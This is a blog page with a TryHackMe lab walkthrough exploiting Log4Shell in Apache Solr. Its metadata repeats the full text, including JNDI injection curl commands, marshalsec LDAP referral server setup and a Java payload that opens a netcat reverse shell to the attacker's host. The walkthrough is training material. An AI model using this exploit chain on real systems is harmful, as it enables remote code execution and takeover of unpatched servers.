<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>LOG4J-Solr-THM-Walkthrough | Thebyteman</title>
<meta name="generator" content="Jekyll v3.9.0" />
<meta property="og:title" content="LOG4J-Solr-THM-Walkthrough" />
<meta name="author" content="Thebyteman" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="The room for practicing Log4j can be found here: https://tryhackme.com/room/solar Phase 1: Reconnaissance We explore the web interface at http://machine_ip[:]8983; we explore and look around for the log files, to see which path or URL endpoint triggers the logging. We find that “solr/admin/cores/” is where a user can control the data entry point. You may already know the general payload to abuse this log4j vulnerability. The format of the usual syntax that takes advantage of this looks like so: ${jndi: ldap://ATTACKERCONTROLLEDHOST} This syntax indicates that the log4j will invoke functionality from “JNDI”, or the “Java Naming and Directory Interface.” Ultimately, this can be used to access external resources, or “references,” which is what is weaponized in this attack. Notice the ldap:// schema. This indicates that the target will reach out to an endpoint (an attacker controlled location, in the case of this attack) via the LDAP protocol. For now, know that the target will in fact make a connection to an external location. This is indicated by the ATTACKERCONTROLLEDHOST placeholder in the above syntax. You, acting as the attacker in this scenario, can host a simple listener to view this connection. We already discovered that we could supply parameter to the /solr/admin/cores URL to insert our JNDI Syntax. Other locations you might supply this JNDI syntax: • Input boxes, user and password login forms, data entry points within applications • HTTP headers such as User-Agent, X-Forwarded-For, or other customizable headers • Any place for user-supplied data Phase 2: Testing To prepare your environment for testing the vulnerability and receiving a connection We view our own IP address information: a. “ip addr show” OR “ip -br -c a” We prepare a netcat listener on port 9999 a. “nc -nlvp 9999” Now that you have a listener staged, make a request including this primitive JNDI payload syntax as part of the HTTP parameters. This can easily be done with the curl command line utility. “curl ‘http://machine_ip[:]8983/solr/admin/cores?foo$\{jndi:ldap://Your.IP.Address:9999\}’ Note, due to the use of the $ dollar-sign character in your syntax, you must ensure you wrap the URL within single-quotes, so bash (your command-line shell) does not interpret it as a variable. Additionally, you must escape out the { } curly braces with a single backslash character, so those are not misrepresented in the curl command arguments. Verify you have received a connection by seeing the following message in your netcat listener: a. “Connection received from MACHINE_IP” Phase 3: Preparation and Payload Creation At this point, you have verified the target is in fact vulnerable by seeing this connection caught in your netcat listener. However, it made an LDAP request… so all your netcat listener may have seen was non-printable characters (strange looking bytes). We can now build upon this foundation to respond with a real LDAP Handler. We will utilize an open-source and public utility to stage an “LDAP Referral Server”. This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run code on the target. This breaks down like so: 1. ${jndi:ldap://attackerserver:1389/Resource} -&gt; reaches out to our LDAP Referral Server 2. LDAP Referral Server springboards the request to a secondary http://attackerserver/resource 3. The victim retrieves and executes the code present in http://attackerserver/resource This means we will need an HTTP server, which we could simply host with any of the following options (serving on port 8000): • python3 -m http.server 8000 The first order of business however is obtaining the LDAP Referral Server. We will use the marshalsec utility offered at https://github.com/mbechler/marshalsec Ultimately, this needs to run Java. Reviewing the README for this utility, it suggests using Java 8. (You may or may not have success using a different version, but to “play by the rules,” we will match the same version of Java used on the target virtual machine) You can find a mirror of different Java versions to run on Linux at this location. http://mirrors.rootpei.com/jdk/ and we install Java 8 locally. Now we install Marshalsec utility from github. 1. Clone the repository in any file system location of your choice (I would suggest /tmp or /opt): a. git clone https://github.com/mbechler/marshalsec 2. Download and change directories into this new folder (cd marshalsec) We must build marshalsec with the Java builder maven. If you do not yet have maven on your system, you can install it through your package manager: &#39;sudo apt install maven&#39; 3. Now, we install the maven packages: &#39;mvn clean package -DskipTests&#39; 4. With the marshalsec utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server (which we will prepare in just a moment). The syntax to start the LDAP server is as follows: a. java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit” Adjust the IP address for your attacking machine as needed. Note that we supplied the HTTP port listening on 8000. You will see an output on your window similar to below: &quot;Listening on 0.0.0.0:1389&quot; Now that our LDAP server is ready and waiting, we can open a second terminal window to prepare our final payload and secondary HTTP server. Ultimately, the log4j vulnerability will execute arbitrary code that you craft within the Java programming language. Create and move into a new directory where you might host this payload. First, create your payload in a text editor of your choice (mousepad, nano, vim, Sublime Text, VS Code etc), with the specific name Exploit.java: public class Exploit {static {try { java.lang.Runtime.getRuntime().exec(&quot;nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999&quot;); } catch (Exception e) {e.printStackTrace(); }}} Compile your payload with javac Exploit.java -source 8 -target 8 and verify it succeeded by running the &#39;ls&#39; command and finding a newly created Exploit.class file With your payload created and compiled, you can now host it by spinning up a temporary HTTP server. Python3 -m http.server 8000 Phase 4: Exploitation Your payload is created and compiled, it is hosted with an HTTP server in one terminal, your LDAP referral server is up and waiting in another terminal – next prepare a netcat listener to catch your reverse shell in yet another new terminal window: nc -nlvp 9999 Finally, all that is left to do is trigger the exploit and fire off our JNDI syntax! Note the changes in port number (now referring to our LDAP server) and the resource we retrieve, specifying our exploit: curl &#39;http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:138 9/Exploit\}&#39; You have now received initial access and command-and-control on an Apache Solr instance. This is just one example of many, many vulnerable applications affected by this log4j vulnerability. At this point, a threat actor can realistically do whatever they would like with the victim – whether it be privilege escalation, exfiltration, install persistence, perform lateral movement or any other postexploitation – potentially dropping cryptocurrency miners, remote access trojans, beacons and implants or even deploying ransomware. All it took was a single string of text, and a little bit of set up with freely available tooling. This was precisely why the Internet has been on fire during the weekend of December 9th, 2021." />
<meta property="og:description" content="The room for practicing Log4j can be found here: https://tryhackme.com/room/solar Phase 1: Reconnaissance We explore the web interface at http://machine_ip[:]8983; we explore and look around for the log files, to see which path or URL endpoint triggers the logging. We find that “solr/admin/cores/” is where a user can control the data entry point. You may already know the general payload to abuse this log4j vulnerability. The format of the usual syntax that takes advantage of this looks like so: ${jndi: ldap://ATTACKERCONTROLLEDHOST} This syntax indicates that the log4j will invoke functionality from “JNDI”, or the “Java Naming and Directory Interface.” Ultimately, this can be used to access external resources, or “references,” which is what is weaponized in this attack. Notice the ldap:// schema. This indicates that the target will reach out to an endpoint (an attacker controlled location, in the case of this attack) via the LDAP protocol. For now, know that the target will in fact make a connection to an external location. This is indicated by the ATTACKERCONTROLLEDHOST placeholder in the above syntax. You, acting as the attacker in this scenario, can host a simple listener to view this connection. We already discovered that we could supply parameter to the /solr/admin/cores URL to insert our JNDI Syntax. Other locations you might supply this JNDI syntax: • Input boxes, user and password login forms, data entry points within applications • HTTP headers such as User-Agent, X-Forwarded-For, or other customizable headers • Any place for user-supplied data Phase 2: Testing To prepare your environment for testing the vulnerability and receiving a connection We view our own IP address information: a. “ip addr show” OR “ip -br -c a” We prepare a netcat listener on port 9999 a. “nc -nlvp 9999” Now that you have a listener staged, make a request including this primitive JNDI payload syntax as part of the HTTP parameters. This can easily be done with the curl command line utility. “curl ‘http://machine_ip[:]8983/solr/admin/cores?foo$\{jndi:ldap://Your.IP.Address:9999\}’ Note, due to the use of the $ dollar-sign character in your syntax, you must ensure you wrap the URL within single-quotes, so bash (your command-line shell) does not interpret it as a variable. Additionally, you must escape out the { } curly braces with a single backslash character, so those are not misrepresented in the curl command arguments. Verify you have received a connection by seeing the following message in your netcat listener: a. “Connection received from MACHINE_IP” Phase 3: Preparation and Payload Creation At this point, you have verified the target is in fact vulnerable by seeing this connection caught in your netcat listener. However, it made an LDAP request… so all your netcat listener may have seen was non-printable characters (strange looking bytes). We can now build upon this foundation to respond with a real LDAP Handler. We will utilize an open-source and public utility to stage an “LDAP Referral Server”. This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run code on the target. This breaks down like so: 1. ${jndi:ldap://attackerserver:1389/Resource} -&gt; reaches out to our LDAP Referral Server 2. LDAP Referral Server springboards the request to a secondary http://attackerserver/resource 3. The victim retrieves and executes the code present in http://attackerserver/resource This means we will need an HTTP server, which we could simply host with any of the following options (serving on port 8000): • python3 -m http.server 8000 The first order of business however is obtaining the LDAP Referral Server. We will use the marshalsec utility offered at https://github.com/mbechler/marshalsec Ultimately, this needs to run Java. Reviewing the README for this utility, it suggests using Java 8. (You may or may not have success using a different version, but to “play by the rules,” we will match the same version of Java used on the target virtual machine) You can find a mirror of different Java versions to run on Linux at this location. http://mirrors.rootpei.com/jdk/ and we install Java 8 locally. Now we install Marshalsec utility from github. 1. Clone the repository in any file system location of your choice (I would suggest /tmp or /opt): a. git clone https://github.com/mbechler/marshalsec 2. Download and change directories into this new folder (cd marshalsec) We must build marshalsec with the Java builder maven. If you do not yet have maven on your system, you can install it through your package manager: &#39;sudo apt install maven&#39; 3. Now, we install the maven packages: &#39;mvn clean package -DskipTests&#39; 4. With the marshalsec utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server (which we will prepare in just a moment). The syntax to start the LDAP server is as follows: a. java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit” Adjust the IP address for your attacking machine as needed. Note that we supplied the HTTP port listening on 8000. You will see an output on your window similar to below: &quot;Listening on 0.0.0.0:1389&quot; Now that our LDAP server is ready and waiting, we can open a second terminal window to prepare our final payload and secondary HTTP server. Ultimately, the log4j vulnerability will execute arbitrary code that you craft within the Java programming language. Create and move into a new directory where you might host this payload. First, create your payload in a text editor of your choice (mousepad, nano, vim, Sublime Text, VS Code etc), with the specific name Exploit.java: public class Exploit {static {try { java.lang.Runtime.getRuntime().exec(&quot;nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999&quot;); } catch (Exception e) {e.printStackTrace(); }}} Compile your payload with javac Exploit.java -source 8 -target 8 and verify it succeeded by running the &#39;ls&#39; command and finding a newly created Exploit.class file With your payload created and compiled, you can now host it by spinning up a temporary HTTP server. Python3 -m http.server 8000 Phase 4: Exploitation Your payload is created and compiled, it is hosted with an HTTP server in one terminal, your LDAP referral server is up and waiting in another terminal – next prepare a netcat listener to catch your reverse shell in yet another new terminal window: nc -nlvp 9999 Finally, all that is left to do is trigger the exploit and fire off our JNDI syntax! Note the changes in port number (now referring to our LDAP server) and the resource we retrieve, specifying our exploit: curl &#39;http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:138 9/Exploit\}&#39; You have now received initial access and command-and-control on an Apache Solr instance. This is just one example of many, many vulnerable applications affected by this log4j vulnerability. At this point, a threat actor can realistically do whatever they would like with the victim – whether it be privilege escalation, exfiltration, install persistence, perform lateral movement or any other postexploitation – potentially dropping cryptocurrency miners, remote access trojans, beacons and implants or even deploying ransomware. All it took was a single string of text, and a little bit of set up with freely available tooling. This was precisely why the Internet has been on fire during the weekend of December 9th, 2021." />
<link rel="canonical" href="http://localhost:4000/blog-walkthroughs/walkthroughs/2022/01/04/Log4j-THM-Walkthrough.html" />
<meta property="og:url" content="http://localhost:4000/blog-walkthroughs/walkthroughs/2022/01/04/Log4j-THM-Walkthrough.html" />
<meta property="og:site_name" content="Thebyteman" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-01-04T17:03:35+05:30" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="LOG4J-Solr-THM-Walkthrough" />
<script type="application/ld+json">
{"headline":"LOG4J-Solr-THM-Walkthrough","dateModified":"2022-01-04T17:03:35+05:30","datePublished":"2022-01-04T17:03:35+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog-walkthroughs/walkthroughs/2022/01/04/Log4j-THM-Walkthrough.html"},"url":"http://localhost:4000/blog-walkthroughs/walkthroughs/2022/01/04/Log4j-THM-Walkthrough.html","author":{"@type":"Person","name":"Thebyteman"},"@type":"BlogPosting","description":"The room for practicing Log4j can be found here: https://tryhackme.com/room/solar Phase 1: Reconnaissance We explore the web interface at http://machine_ip[:]8983; we explore and look around for the log files, to see which path or URL endpoint triggers the logging. We find that “solr/admin/cores/” is where a user can control the data entry point. You may already know the general payload to abuse this log4j vulnerability. The format of the usual syntax that takes advantage of this looks like so: ${jndi: ldap://ATTACKERCONTROLLEDHOST} This syntax indicates that the log4j will invoke functionality from “JNDI”, or the “Java Naming and Directory Interface.” Ultimately, this can be used to access external resources, or “references,” which is what is weaponized in this attack. Notice the ldap:// schema. This indicates that the target will reach out to an endpoint (an attacker controlled location, in the case of this attack) via the LDAP protocol. For now, know that the target will in fact make a connection to an external location. This is indicated by the ATTACKERCONTROLLEDHOST placeholder in the above syntax. You, acting as the attacker in this scenario, can host a simple listener to view this connection. We already discovered that we could supply parameter to the /solr/admin/cores URL to insert our JNDI Syntax. Other locations you might supply this JNDI syntax: • Input boxes, user and password login forms, data entry points within applications • HTTP headers such as User-Agent, X-Forwarded-For, or other customizable headers • Any place for user-supplied data Phase 2: Testing To prepare your environment for testing the vulnerability and receiving a connection We view our own IP address information: a. “ip addr show” OR “ip -br -c a” We prepare a netcat listener on port 9999 a. “nc -nlvp 9999” Now that you have a listener staged, make a request including this primitive JNDI payload syntax as part of the HTTP parameters. This can easily be done with the curl command line utility. “curl ‘http://machine_ip[:]8983/solr/admin/cores?foo$\\{jndi:ldap://Your.IP.Address:9999\\}’ Note, due to the use of the $ dollar-sign character in your syntax, you must ensure you wrap the URL within single-quotes, so bash (your command-line shell) does not interpret it as a variable. Additionally, you must escape out the { } curly braces with a single backslash character, so those are not misrepresented in the curl command arguments. Verify you have received a connection by seeing the following message in your netcat listener: a. “Connection received from MACHINE_IP” Phase 3: Preparation and Payload Creation At this point, you have verified the target is in fact vulnerable by seeing this connection caught in your netcat listener. However, it made an LDAP request… so all your netcat listener may have seen was non-printable characters (strange looking bytes). We can now build upon this foundation to respond with a real LDAP Handler. We will utilize an open-source and public utility to stage an “LDAP Referral Server”. This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run code on the target. This breaks down like so: 1. ${jndi:ldap://attackerserver:1389/Resource} -&gt; reaches out to our LDAP Referral Server 2. LDAP Referral Server springboards the request to a secondary http://attackerserver/resource 3. The victim retrieves and executes the code present in http://attackerserver/resource This means we will need an HTTP server, which we could simply host with any of the following options (serving on port 8000): • python3 -m http.server 8000 The first order of business however is obtaining the LDAP Referral Server. We will use the marshalsec utility offered at https://github.com/mbechler/marshalsec Ultimately, this needs to run Java. Reviewing the README for this utility, it suggests using Java 8. (You may or may not have success using a different version, but to “play by the rules,” we will match the same version of Java used on the target virtual machine) You can find a mirror of different Java versions to run on Linux at this location. http://mirrors.rootpei.com/jdk/ and we install Java 8 locally. Now we install Marshalsec utility from github. 1. Clone the repository in any file system location of your choice (I would suggest /tmp or /opt): a. git clone https://github.com/mbechler/marshalsec 2. Download and change directories into this new folder (cd marshalsec) We must build marshalsec with the Java builder maven. If you do not yet have maven on your system, you can install it through your package manager: &#39;sudo apt install maven&#39; 3. Now, we install the maven packages: &#39;mvn clean package -DskipTests&#39; 4. With the marshalsec utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server (which we will prepare in just a moment). The syntax to start the LDAP server is as follows: a. java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit” Adjust the IP address for your attacking machine as needed. Note that we supplied the HTTP port listening on 8000. You will see an output on your window similar to below: &quot;Listening on 0.0.0.0:1389&quot; Now that our LDAP server is ready and waiting, we can open a second terminal window to prepare our final payload and secondary HTTP server. Ultimately, the log4j vulnerability will execute arbitrary code that you craft within the Java programming language. Create and move into a new directory where you might host this payload. First, create your payload in a text editor of your choice (mousepad, nano, vim, Sublime Text, VS Code etc), with the specific name Exploit.java: public class Exploit {static {try { java.lang.Runtime.getRuntime().exec(&quot;nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999&quot;); } catch (Exception e) {e.printStackTrace(); }}} Compile your payload with javac Exploit.java -source 8 -target 8 and verify it succeeded by running the &#39;ls&#39; command and finding a newly created Exploit.class file With your payload created and compiled, you can now host it by spinning up a temporary HTTP server. Python3 -m http.server 8000 Phase 4: Exploitation Your payload is created and compiled, it is hosted with an HTTP server in one terminal, your LDAP referral server is up and waiting in another terminal – next prepare a netcat listener to catch your reverse shell in yet another new terminal window: nc -nlvp 9999 Finally, all that is left to do is trigger the exploit and fire off our JNDI syntax! Note the changes in port number (now referring to our LDAP server) and the resource we retrieve, specifying our exploit: curl &#39;http://MACHINE_IP:8983/solr/admin/cores?foo=$\\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:138 9/Exploit\\}&#39; You have now received initial access and command-and-control on an Apache Solr instance. This is just one example of many, many vulnerable applications affected by this log4j vulnerability. At this point, a threat actor can realistically do whatever they would like with the victim – whether it be privilege escalation, exfiltration, install persistence, perform lateral movement or any other postexploitation – potentially dropping cryptocurrency miners, remote access trojans, beacons and implants or even deploying ransomware. All it took was a single string of text, and a little bit of set up with freely available tooling. This was precisely why the Internet has been on fire during the weekend of December 9th, 2021.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Thebyteman" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><!--- original title logo code
    <a class="site-title" rel="author" href="/">Thebyteman</a>
    -->  
    <!---Custom title logo code-->
    <a class="site-title" rel="author" href="/"><img src="/images/site-logo.png" alt="Thebyteman"></a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/blog-walkthroughs/">Walkthroughs</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">LOG4J-Solr-THM-Walkthrough</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2022-01-04T17:03:35+05:30" itemprop="datePublished">Jan 4, 2022
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>The room for practicing Log4j can be found here: https://tryhackme.com/room/solar</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">Phase</span> <span class="mi">1</span><span class="p">:</span> <span class="no">Reconnaissance</span></code></pre></figure>

<p>We explore the web interface at http://machine_ip[:]8983; we explore and look around for the log files, to see which path or URL endpoint triggers the logging.</p>

<p>We find that</p>
<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="err">“</span><span class="n">solr</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">cores</span><span class="o">/</span><span class="err">”</span></code></pre></figure>
<p>is where a user can control the data entry point.</p>

<p>You may already know the general payload to abuse this log4j vulnerability.</p>

<p>The format of the usual syntax that takes advantage of this looks like so: 
                ${jndi: ldap://ATTACKERCONTROLLEDHOST}</p>

<p>This syntax indicates that the log4j will invoke functionality from “JNDI”, or the “Java Naming and Directory Interface.” Ultimately, this can be used to access external resources, or “references,” which is what is weaponized in this attack.</p>

<p>Notice the ldap:// schema. This indicates that the target will reach out to an endpoint (an attacker controlled location, in the case of this attack) via the LDAP protocol. For now, know that the target will in fact make a connection to an external location. This is indicated by the 
ATTACKERCONTROLLEDHOST placeholder in the above syntax. You, acting as the attacker in this scenario, can host a simple listener to view this connection.</p>

<p>We already discovered that we could supply parameter to the /solr/admin/cores URL to insert our JNDI Syntax.</p>

<p>Other locations you might supply this JNDI syntax: 
•	Input boxes, user and password login forms, data entry points within applications 
•	HTTP headers such as User-Agent, X-Forwarded-For, or other customizable headers 
•	Any place for user-supplied data</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">Phase</span> <span class="mi">2</span><span class="p">:</span> <span class="no">Testing</span></code></pre></figure>

<p>To prepare your environment for testing the vulnerability and receiving a connection</p>

<ol>
  <li>
    <p>We view our own IP address information: 
a.	“ip addr show” OR “ip -br -c a”</p>
  </li>
  <li>
    <p>We prepare a netcat listener on port 9999<br />
a.	“nc -nlvp 9999”</p>
  </li>
  <li>
    <p>Now that you have a listener staged, make a request including this primitive JNDI payload syntax as part of the HTTP parameters. This can easily be done with the curl command line utility.</p>
  </li>
</ol>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="err">“</span><span class="n">curl</span> <span class="err">‘</span><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">machine_ip</span><span class="p">[:]</span><span class="mi">8983</span><span class="o">/</span><span class="n">solr</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">cores?foo</span><span class="vg">$\</span><span class="p">{</span><span class="n">jndi</span><span class="ss">:ldap:/</span><span class="o">/</span><span class="no">Your</span><span class="o">.</span><span class="no">IP</span><span class="o">.</span><span class="no">Address</span><span class="p">:</span><span class="mi">9999</span><span class="p">\}</span><span class="err">’</span></code></pre></figure>

<p>Note, due to the use of the $ dollar-sign character in your syntax, you must ensure you wrap the URL within single-quotes, so bash (your command-line shell) does not interpret it as a variable. 
Additionally, you must escape out the { } curly braces with a single backslash character, so those are not misrepresented in the curl command arguments.</p>

<ol>
  <li>Verify you have received a connection by seeing the following message in your netcat listener: 
a.	“Connection received from MACHINE_IP”</li>
</ol>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">Phase</span> <span class="mi">3</span><span class="p">:</span> <span class="no">Preparation</span> <span class="n">and</span> <span class="no">Payload</span> <span class="no">Creation</span></code></pre></figure>

<p>At this point, you have verified the target is in fact vulnerable by seeing this connection caught in your netcat listener. However, it made an LDAP request… so all your netcat listener may have seen was non-printable characters (strange looking bytes). We can now build upon this foundation to respond with a real LDAP Handler. We will utilize an open-source and public utility to stage an “LDAP Referral Server”. This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run code on the target. This breaks down like so:</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="mi">1</span><span class="o">.</span>	<span class="err">$</span><span class="p">{</span><span class="n">jndi</span><span class="ss">:ldap:/</span><span class="o">/</span><span class="n">attackerserver</span><span class="p">:</span><span class="mi">1389</span><span class="o">/</span><span class="no">Resource</span><span class="p">}</span> <span class="o">-&gt;</span> <span class="n">reaches</span> <span class="n">out</span> <span class="n">to</span> <span class="n">our</span> <span class="no">LDAP</span> <span class="no">Referral</span> <span class="no">Server</span> 
<span class="mi">2</span><span class="o">.</span>	<span class="no">LDAP</span> <span class="no">Referral</span> <span class="no">Server</span> <span class="n">springboards</span> <span class="n">the</span> <span class="n">request</span> <span class="n">to</span> <span class="n">a</span> <span class="n">secondary</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">attackerserver</span><span class="o">/</span><span class="n">resource</span> 
<span class="mi">3</span><span class="o">.</span>	<span class="no">The</span> <span class="n">victim</span> <span class="n">retrieves</span> <span class="n">and</span> <span class="n">executes</span> <span class="n">the</span> <span class="n">code</span> <span class="n">present</span> <span class="k">in</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">attackerserver</span><span class="o">/</span><span class="n">resource</span> </code></pre></figure>

<p>This means we will need an HTTP server, which we could simply host with any of the following options (serving on port 8000):</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">	<span class="err">•</span> 	<span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="nf">server</span> <span class="mi">8000</span> </code></pre></figure>

<p>The first order of business however is obtaining the LDAP Referral Server. We will use the marshalsec utility offered at https://github.com/mbechler/marshalsec</p>

<p>Ultimately, this needs to run Java. Reviewing the README for this utility, it suggests using Java 8. (You may or may not have success using a different version, but to “play by the rules,” we will match the same version of Java used on the target virtual machine)</p>

<p>You can find a mirror of different Java versions to run on Linux at this location. http://mirrors.rootpei.com/jdk/ and we install Java 8 locally. 
Now we install Marshalsec utility from github.</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="mi">1</span><span class="o">.</span> <span class="no">Clone</span> <span class="n">the</span> <span class="n">repository</span> <span class="k">in</span> <span class="n">any</span> <span class="n">file</span> <span class="nb">system</span> <span class="n">location</span> <span class="n">of</span> <span class="n">your</span> <span class="n">choice</span> <span class="p">(</span><span class="no">I</span> <span class="n">would</span> <span class="n">suggest</span> <span class="sr">/tmp or /o</span><span class="n">pt</span><span class="p">):</span> 
<span class="n">a</span><span class="p">.</span> <span class="nf">git</span> <span class="nb">clone</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">github</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="n">mbechler</span><span class="o">/</span><span class="n">marshalsec</span> 

<span class="mi">2</span><span class="o">.</span>	<span class="no">Download</span> <span class="n">and</span> <span class="n">change</span> <span class="n">directories</span> <span class="n">into</span> <span class="n">this</span> <span class="n">new</span> <span class="n">folder</span> <span class="p">(</span><span class="n">cd</span> <span class="n">marshalsec</span><span class="p">)</span> <span class="no">We</span> <span class="n">must</span> <span class="n">build</span> <span class="n">marshalsec</span> <span class="n">with</span> <span class="n">the</span> <span class="no">Java</span> <span class="n">builder</span> <span class="n">maven</span><span class="o">.</span> <span class="no">If</span> <span class="n">you</span> <span class="k">do</span> <span class="n">not</span> <span class="n">yet</span> <span class="n">have</span> <span class="n">maven</span> <span class="n">on</span> <span class="n">your</span> <span class="nb">system</span><span class="p">,</span> <span class="n">you</span> <span class="n">can</span> <span class="n">install</span> <span class="n">it</span> <span class="n">through</span> <span class="n">your</span> <span class="n">package</span> <span class="ss">manager: </span><span class="s1">'sudo apt install maven'</span>

<span class="mi">3</span><span class="o">.</span>	<span class="no">Now</span><span class="p">,</span> <span class="n">we</span> <span class="n">install</span> <span class="n">the</span> <span class="n">maven</span> <span class="ss">packages:  </span><span class="s1">'mvn clean package -DskipTests'</span> 

<span class="mi">4</span><span class="o">.</span>	<span class="no">With</span> <span class="n">the</span> <span class="n">marshalsec</span> <span class="n">utility</span> <span class="n">built</span><span class="p">,</span> <span class="n">we</span> <span class="n">can</span> <span class="n">start</span> <span class="n">an</span> <span class="no">LDAP</span> <span class="n">referral</span> <span class="n">server</span> <span class="n">to</span> <span class="n">direct</span> <span class="n">connections</span> <span class="n">to</span> <span class="n">our</span> <span class="n">secondary</span> <span class="no">HTTP</span> <span class="n">server</span> <span class="p">(</span><span class="n">which</span> <span class="n">we</span> <span class="n">will</span> <span class="n">prepare</span> <span class="k">in</span> <span class="n">just</span> <span class="n">a</span> <span class="n">moment</span><span class="p">)</span><span class="o">.</span> <span class="no">The</span> <span class="n">syntax</span> <span class="n">to</span> <span class="n">start</span> <span class="n">the</span> <span class="no">LDAP</span> <span class="n">server</span> <span class="n">is</span> <span class="n">as</span> <span class="ss">follows: 
</span><span class="n">a</span><span class="p">.</span> <span class="nf">java</span> <span class="o">-</span><span class="n">cp</span> <span class="n">target</span><span class="o">/</span><span class="n">marshalsec</span><span class="o">-</span><span class="mf">0.0</span><span class="o">.</span><span class="mi">3</span><span class="o">-</span><span class="no">SNAPSHOT</span><span class="o">-</span><span class="n">all</span><span class="p">.</span><span class="nf">jar</span> <span class="n">marshalsec</span><span class="p">.</span><span class="nf">jndi</span><span class="o">.</span><span class="no">LDAPRefServer</span> <span class="err">“</span><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="no">YOUR</span><span class="o">.</span><span class="no">ATTACKER</span><span class="o">.</span><span class="no">IP</span><span class="o">.</span><span class="no">ADDRESS</span><span class="p">:</span><span class="mi">8000</span><span class="o">/</span><span class="c1">#Exploit” </span></code></pre></figure>

<p>Adjust the IP address for your attacking machine as needed. Note that we supplied the HTTP port listening on 8000.</p>

<p>You will see an output on your window similar to below:</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="s2">"Listening on 0.0.0.0:1389"</span></code></pre></figure>

<p>Now that our LDAP server is ready and waiting, we can open a second terminal window to prepare our final payload and secondary HTTP server.</p>

<p>Ultimately, the log4j vulnerability will execute arbitrary code that you craft within the Java programming language.</p>

<p>Create and move into a new directory where you might host this payload. First, create your payload in a text editor of your choice (mousepad, nano, vim, Sublime Text, VS Code etc), with the specific name Exploit.java:</p>

